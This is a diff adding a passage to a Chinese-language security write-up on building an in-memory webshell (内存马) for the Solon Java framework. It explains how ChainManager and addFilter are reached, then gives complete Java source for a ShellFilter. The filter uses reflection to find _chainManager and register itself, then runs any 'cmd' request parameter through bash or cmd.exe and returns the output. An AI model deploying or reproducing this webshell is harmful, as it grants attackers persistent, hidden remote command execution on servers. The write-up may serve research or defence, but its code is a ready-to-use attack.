@@ -69,3 +69,71 @@ public class TestFilter implements Filter {
 简单阅读代码可以看到在ChainManager，有方法addFilter
 
 ![](attachments/Pasted%20image%2020241205214846.png)
+
+
+过滤器添加断点获取到了org/noear/solon/core/route/RouterWrapper.java处进行了ChainManger的初始化，以及对addFilter的调用。
+
+![](attachments/Pasted%20image%2020241205220627.png)
+
+因此编写solon的内存马主要就是找到内存变量_chainManger，并调用它的doFilter加载恶意Filter
+
+## 内存马编写
+
+```JAVA
+package com.example.demo;  
+import org.noear.solon.annotation.Component;  
+import org.noear.solon.core.ChainManager;  
+import org.noear.solon.core.handle.Context;  
+import org.noear.solon.core.handle.Filter;  
+import org.noear.solon.core.handle.FilterChain;  
+import java.lang.reflect.Field;  
+@Component  
+public class ShellFilter implements Filter {  
+    static {  
+        try {  
+            Context ctx = Context.current();  
+            Object obj = ctx.request();  
+            Field field = obj.getClass().getSuperclass().getDeclaredField("request");  
+            field.setAccessible(true);  
+            obj = field.get(obj);  
+            field = obj.getClass().getDeclaredField("serverHandler");  
+            field.setAccessible(true);  
+            obj = field.get(obj);  
+            field = obj.getClass().getDeclaredField("handler");  
+            field.setAccessible(true);  
+            obj = field.get(obj);  
+            field = obj.getClass().getDeclaredField("arg$1");  
+            field.setAccessible(true);  
+            obj = field.get(obj);  
+            field = obj.getClass().getSuperclass().getDeclaredField("_chainManager");  
+            field.setAccessible(true);  
+            obj = field.get(obj);  
+            ChainManager chainManager = (ChainManager) obj;  
+            chainManager.addFilter(new ShellFilter(), 0);  
+        }catch (Exception e){  
+            e.printStackTrace();  
+        }  
+    }  
+    @Override  
+    public void doFilter(Context ctx, FilterChain chain) throws Throwable {  
+        try{  
+            if(ctx.param("cmd")!=null){  
+                String str = ctx.param("cmd");  
+                try{  
+                    String[] cmds =  
+                            System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe",  
+                                    "/c", str} : new String[]{"/bin/bash", "-c", str};  
+                    String output = (new java.util.Scanner((new  
+                            ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next();  
+                    ctx.output(output);  
+                }catch (Exception e) {  
+                    e.printStackTrace();  
+                }  
+            }  
+        }catch (Throwable e){  
+            System.out.println("异常："+e.getMessage()) ;  
+        }  
+        chain.doFilter(ctx);  
+    }  
+}
+```
